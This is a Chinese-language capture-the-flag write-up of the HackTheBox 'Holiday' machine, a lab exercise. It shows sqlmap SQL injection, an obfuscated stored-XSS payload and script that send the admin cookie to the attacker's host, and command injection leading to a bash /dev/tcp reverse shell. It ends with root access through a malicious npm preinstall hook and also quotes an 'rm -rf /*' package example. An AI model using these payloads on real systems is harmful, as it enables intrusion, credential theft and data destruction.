![](./img/4560330053760561074.png)

## 信息搜集

### nmap

通过nmap扫描发现了靶机只存在ssh和Node.js框架下的http服务。进入网站首页并没有发现什么有用的信息。

    
    
    # Nmap 7.92 scan initiated Tue Apr 18 07:38:06 2023 as: nmap -Pn -sV -sC -A -oN nmap.txt 10.10.10.25
    Nmap scan report for 10.10.10.25
    Host is up (0.26s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
    |   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
    |_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (ED25519)
    8000/tcp open  http    Node.js Express framework
    |_http-title: Error
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.92%E=4%D=4/18%OT=22%CT=1%CU=34005%PV=Y%DS=2%DC=T%G=Y%TM=643E815
    OS:5%P=i686-pc-windows-windows)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)SEQ(
    OS:SP=100%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)SEQ(CI=I%II=I)OPS(O1=M550ST11NW
    OS:7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M550ST11NW7%O6=M550ST
    OS:11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40
    OS:%W=7210%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R
    OS:=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W
    OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
    OS:T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%U
    OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
    
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    TRACEROUTE (using port 8888/tcp)
    HOP RTT       ADDRESS
    1   258.00 ms 10.10.14.1
    2   258.00 ms 10.10.10.25
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Tue Apr 18 07:39:01 2023 -- 1 IP address (1 host up) scanned in 55.41 seconds

### dirserch

![](./img/1595609757179111941.png)

访问/login或者访问/admin跳转至login是一个简单的登录页面，尝试了默认用户以及爆破用户名都回显 Invalid User

![](./img/1821866747168335632.png)

通过简单的手工测试，发现账号后面加上双引号产生报错，sql注入大概率有了

![](./img/4105814079842111208.png)

### sqlmap

把数据包丢进sqlmap里面跑，但是不加参数跑不出来，需要加上level和risk

    
    
    python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5
    =================================================================================================================
    POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
    sqlmap identified the following injection point(s) with a total of 474 HTTP(s) requests:
    ---    Parameter: username (POST)
        Type: boolean-based blind
        Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
        Payload: username=admin") OR NOT 8580=8580 AND ("MLnl"="MLnl&password=admin
    
        Type: time-based blind
        Title: SQLite > 2.0 OR time-based blind (heavy query)
        Payload: username=admin") OR 3510=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ("YPRb"="
    YPRb&password=admin
    ---    [08:32:00] [INFO] the back-end DBMS is SQLite
    web application technology: Express
    back-end DBMS: SQLite

查看表

    
    
    python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5 --tables
    ================================================================================
    <current>
    [5 tables]
    +-----------------+
    | bookings        |
    | notes           |
    | sessions        |
    | sqlite_sequence |
    | users           |
    +-----------------+

查看user表中的数据，得到账号 RickA和密码的md5，解密后得到密码

    
    
    python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5 -T users --dump
    ===========================================================================================================================
    [08:38:00] [INFO] retrieved: 103
    [08:39:13] [INFO] retrieved: CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,active
     TINYINT(1))
    [08:39:13] [INFO] fetching entries for table 'users'
    [08:39:13] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
    [08:39:13] [INFO] retrieved: 1
    [08:39:14] [INFO] retrieving the length of query output
    [08:39:14] [INFO] retrieved: 1
    [08:39:16] [INFO] retrieved: 1
    [08:39:19] [INFO] retrieving the length of query output
    [08:39:19] [INFO] retrieved: 1
    [08:39:20] [INFO] retrieved: 1
    [08:39:23] [INFO] retrieving the length of query output
    [08:39:23] [INFO] retrieved: 32
    [08:39:49] [INFO] retrieved: fdc8cd4cff2c19e0d1022e78481ddf36
    [08:39:49] [INFO] retrieving the length of query output
    [08:39:49] [INFO] retrieved: 5
    [08:39:55] [INFO] retrieved: RickA
    [08:39:55] [INFO] recognized possible password hashes in column 'password'
    do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
    do you want to crack them via a dictionary-based attack? [Y/n/q] n
    Database: <current>
    Table: users
    [1 entry]
    +----+--------+----------+----------------------------------+
    | id | active | username | password                         |
    +----+--------+----------+----------------------------------+
    | 1  | 1      | RickA    | fdc8cd4cff2c19e0d1022e78481ddf36 |
    +----+--------+----------+----------------------------------+

## 储存型XSS

登录RickA的账号后，得到一个订单管理系统。随便点开一个订单，里面有一个添加note的功能，而且此处提供了线索，提交的留言将在一分钟之内被管理员审核，故可尝试XSS来让管理员执行JavaScript脚本。

![](./img/3150679578487546958.png)

尝试提交`<script src='http://10.10.14.2/xsstest'></script>`

![](./img/3144750481235330689.png)

发现脚本中的`<`和`>`被编码成了`&amp;lt;`和`&amp;gt;`，而且本地没有任何反应。

以下文档存在很多xss绕过手法，很有参考价值。

<https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html>

最后绕过的方法是

`<img src="x/><script>eval(String.fromCharCode(CHARCODE_HERE));</script>">`

其中的CHARCODE_HERE由`document.write('<script
src="http://10.10.14.2/yyj.js"></script>');`转化成CharCode得到

python代码如下：

    
    
    >>> payload='''document.write('<script src="http://10.10.14.2/yyj.js"></script>');'''
    >>> ','.join([str(ord(c)) for c in payload])
    '100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,1
    12,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59'

最后得到的payload：

    
    
    <img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>">
    
    
    C:\Users\14530>nc -lnvp 80
    listening on [any] 80 ...
    connect to [10.10.14.2] from (UNKNOWN) [10.10.10.25] 43950
    GET /yyj.js HTTP/1.1
    Accept: */*
    Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
    User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
    Connection: Keep-Alive
    Accept-Encoding: gzip, deflate
    Accept-Language: en-GB,*
    Host: 10.10.14.2

接下来在本机起一个http服务

    
    
    C:\Users\14530\Desktop\Holiday>python -m http.server 80
    Serving HTTP on :: port 80 (http://[::]:80/) ...

yyj.js文件内容：

    
    
    window.addEventListener('DOMContentLoaded', function(e) {
        window.location = "http://10.10.14.2:81/?cookie=" + encodeURI(document.getElementsByName("cookie")[0].value)
    })

然后在监听81端口以及80端口的yyj.js文件可以正常访问的情况下，重新提交最终的payload

![](./img/371937717715229923.png)

得到管理员的cookie

![](./img/7944703602375392248.png)

## Command Injection

![](./img/8768984803035704685.png)

通过cookie伪造了管理员之后访问 /admin得到了导出订单的按钮，点击之后可以发现是类似数据库的查询功能，并且可查数据库中之前用到的users表

![](./img/2428410573441898192.png)

随便在users后面加一个双引号试试，得到了以下的返回，我们的表名限制在了小写字母、数字、`&` 、`/`以及空格组成的白名单内

    
    
    Invalid table name - only characters in the range of [a-z0-9&\s\/] are allowed

经测试，用url编码之后的`&`拼接语句可触发命令注入漏洞`/admin/export?table=users%26id`

    
    
    uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
    1|RickA|fdc8cd4cff2c19e0d1022e78481ddf36|1

现在注入点有了，但是存在白名单限制，怎么去bypass呢？可以先在本机起一个http服务，把反弹shell的脚本挂在上面，然后用wget命令访问十进制或者六进制转换后的ip地址+文件名，再用bash命令执行此文件。

以下网站有一些简单的反弹shell脚本：  
<https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>

前面挂js恶意代码的时候已经开启了http服务了，我们只需要在网站根目录新建一个用来反弹shell的文件，名叫rev

    
    
    #! /bin/bash
    bash -i >& /dev/tcp/10.0.14.2/2333 0>&1

然后用nc监听2333端口

    
    
    C:\Users\14530>nc -lvp 2333
    listening on [any] 2333 ...

把本地的ip地址转换成十进制数

<https://www.browserling.com/tools/ip-to-dec>

![](./img/3709150076877923708.png)

值得一提的是十进制和六进制的ip地址都可以被windows、linux系统解析，比如把127.0.0.1分别转换成十进制和六进制`2130706433`
`0x7f000001`，ping一下试试

![](./img/579316154614455585.png)

上传rev，回显200

![](./img/9076916017965278246.png)

并且web服务器也收到信号

    
    
    ::ffff:10.10.10.25 - - [18/Apr/2023 22:05:48] "GET /rev HTTP/1.1" 200 -
通过ls命令可以看到rev文件上传成功了，因为网有点卡我多点了几次，所以有重复的文件，但是我们只需要看rev就行了  
![](./img/8336495784192259194.png)

访问`/admin/export?table=b%26bash+rev`执行反弹shell命令，成功得到了webshell

    
    
    C:\Users\14530>nc -lnvp 2333
    listening on [any] 2333 ...
    connect to [10.10.14.2] from (UNKNOWN) [10.10.10.25] 46894
    bash: cannot set terminal process group (1137): Inappropriate ioctl for device
    bash: no job control in this shell
    algernon@holiday:~/app$ whoami
    whoami
    algernon
    algernon@holiday:~/app$

成功拿到第一个flag

    
    
    algernon@holiday:~/app$ cd ..
    cd ..
    algernon@holiday:~$ ls
    ls
    app
    user.txt
    algernon@holiday:~$ cat user.txt
    cat user.txt
    e9451...........................

## 提权

### npm install dangerous

首先检查一下`sudo -l`，有可能会发现惊喜

    
    
    algernon@holiday:~$ sudo -l
    sudo -l
    Matching Defaults entries for algernon on holiday:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User algernon may run the following commands on holiday:
        (ALL) NOPASSWD: /usr/bin/npm i *

发现npm可以不需要密码以管理员权限运行`/usr/bin/npm i *`，npm的全称是Node Package
Manager，是一个NodeJS包管理和分发工具，已经成为了非官方的发布Node模块（包）的标准。

谷歌一下npm install dangerous，大概思路是nodejs包是一个叫`package.json`的文件，其格式如下：

    
    
    {
      "name": "rimrafall",
      "version": "1.0.0",
      "description": "rm -rf /* # DO NOT INSTALL THIS",
      "main": "index.js",
      "scripts": {
        "preinstall": "rm -rf /* /.*"
      },
      "keywords": [
        "rimraf",
        "rmrf"
      ],
      "author": "João Jerónimo",
      "license": "ISC"
    }

其中`preinstall`中的预安装命令会在安装这个包之前执行。这也是为什么npm
install存在危险。在这台靶机中我们需要创建一个文件夹，再创建一个`package.json`来模拟nodejs应用，node包中需要有name和version这两个参数：

    
    
    algernon@holiday:~/yyj$ cat package.json
    cat package.json
    {
      "name": "root_please",
      "version": "1.0.0",
      "scripts": {
        "preinstall": "/bin/bash"
      }
    }

在package.json的上一级目录yyj执行`sudo npm i yyj/ --unsafe`就能获取root权限了，随后拿到root权限下的flag

    
    
    algernon@holiday:~/yyj$ cd ..
    cd ..
    algernon@holiday:~$ ls
    ls
    app
    node_modules
    user.txt
    yyj
    algernon@holiday:~$ sudo npm i yyj/ --unsafe
    sudo npm i yyj/ --unsafe
    
    > root_please@1.0.0 preinstall /home/algernon/node_modules/.staging/root_please-f4b1cb59
    > /bin/bash
    
    ls
    package.json
    whoami
    root
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    root@holiday:~/node_modules/.staging/root_please-f4b1cb59# cd /root
    cd /root
    root@holiday:/root# ls
    ls
    root.txt
    root@holiday:/root# cat root.txt
    cat root.txt
    592d9c91924793c4c8b8ed..........

## 小结

这是我pawd的第一台hackthebox靶机，看到这个界面心里难免有些激动，虽然是看walkthrough做出来的，但是也花了大概一两天的时间拿下靶机以及完成记录。就当做是一个新的开始吧！走起~

![](./img/4472793501201339031.png)

